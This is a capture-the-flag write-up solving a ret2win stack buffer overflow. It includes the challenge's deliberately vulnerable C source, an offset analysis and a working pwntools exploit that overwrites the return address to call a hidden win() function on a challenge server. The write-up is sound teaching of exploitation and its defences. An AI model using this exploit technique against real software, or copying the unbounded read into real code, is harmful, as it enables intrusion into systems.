# Medium Overflow — CTF Writeup

**Category:** Binary Exploitation / Buffer Overflow
**Difficulty:** Medium
**Points:** 200
**Flag:** `ctf{overflowing_return_addresses}`

## Challenge Description

> A startup has developed a simple employee greeting application that welcomes users after they enter their name. During a routine security assessment, you discover that the program reads significantly more data than the allocated buffer can safely store.
>
> While the application appears to terminate normally after displaying the greeting, a hidden function exists within the binary that was intended only for developers during testing. This function is never called during normal execution, making it inaccessible through standard program flow.

## Files Provided

- `vuln` — the target ELF binary
- `vuln.c` — source code

## Source Analysis

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/sendfile.h>
#include <fcntl.h>

void __attribute__((constructor)) setup()
{
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
}

void win()
{
  sendfile(1, open("/flag", 0), 0, 0x100);
}

int main()
{
  char buffer[64];
  printf("Enter your name: ");
  read(0, buffer, 0x100);
  printf("Hello, %s\n", buffer);
  return 0;
}
```

Two things stand out:

1. **`buffer`** is only 64 bytes, but `read()` accepts up to `0x100` (256) bytes — a classic stack buffer overflow. No bounds checking is performed.
2. **`win()`** opens `/flag` and writes it to stdout via `sendfile()`, but it is never called anywhere in `main()`. It's dead code from the program's normal control flow — our target for a control-flow hijack.

## Binary Protections

```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Key takeaways:

- **No stack canary** → we can overwrite the saved return address without detection.
- **No PIE** → the binary loads at a fixed base address (`0x400000`), so `win()`'s address is constant and known ahead of time. No leak needed.
- **NX enabled** → we can't execute shellcode on the stack, but we don't need to — we're redirecting execution to existing code (`win()`) inside the binary, i.e. a **ret2win**.

## Finding the Offset

Disassembling `main`:

```asm
0000000000401234 <main>:
  401234: endbr64
  401238: push   rbp
  401239: mov    rbp, rsp
  40123c: sub    rsp, 0x40        ; 64 bytes reserved for buffer
  401240: lea    rdi, [...]       ; "Enter your name: "
  40124c: call   printf@plt
  401251: lea    rax, [rbp-0x40]  ; buffer address
  401255: mov    edx, 0x100       ; read up to 256 bytes
  40125a: mov    rsi, rax
  40125d: mov    edi, 0x0
  401262: call   read@plt
  ...
  401284: leave
  401285: ret
```

`buffer` sits at `rbp-0x40` (64 bytes below the frame pointer). The stack layout from the buffer to the return address is:

```
[ 64 bytes: buffer      ]
[  8 bytes: saved RBP   ]
[  8 bytes: return addr ]  <-- overwrite this
```

**Offset to the return address = 64 + 8 = 72 bytes.**

## Locating `win()`

Since there's no PIE, symbol addresses are static:

```
win() @ 0x4011fd
```

(Found via `ELF('./vuln').symbols['win']` in pwntools, or `objdump -d vuln | grep '<win>'`.)

## Exploit

Payload layout:

```
[72 bytes of padding] + [8-byte address of win()]
```

```python
from pwn import *

exe = ELF('./vuln')
context.binary = exe

p = remote('172.31.45.248', 32359)   # or process('./vuln') for local testing

win_addr = exe.symbols['win']
log.info(f"win() @ {hex(win_addr)}")

offset = 72  # 64-byte buffer + 8-byte saved RBP
payload = b'A' * offset + p64(win_addr)

p.recvuntil(b'Enter your name: ')
p.send(payload)

p.interactive()
```

### How it works

1. `read()` copies our 80-byte payload into the 64-byte `buffer`, overflowing into the saved RBP and then the return address on the stack.
2. Bytes 73–80 of the payload overwrite the return address with `p64(0x4011fd)` — the address of `win()`.
3. When `main()` executes `leave; ret`, instead of returning to `__libc_start_main`, the CPU pops our forged address off the stack and jumps into `win()`.
4. `win()` opens `/flag` and streams it to stdout via `sendfile()`.

## Result

```
$ python3 exploit.py
[+] Opening connection to 172.31.45.248 on port 32359: Done
[*] win() @ 0x4011fd
[*] Switching to interactive mode
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfd\x11@
ctf{overflowing_return_addresses}
```

**Flag:** `ctf{overflowing_return_addresses}`

## Key Lessons

- Unbounded `read()`/`gets()`/`strcpy()` calls into fixed-size stack buffers are the root cause of classic stack overflows.
- Without a stack canary, the saved return address is trivially overwritable.
- Without PIE, no address leak is required — a ret2win is a single-shot exploit.
- `NX` prevents shellcode injection but does *not* stop control-flow hijacks that redirect execution to existing, legitimate code already in the binary (ret2win / ROP).
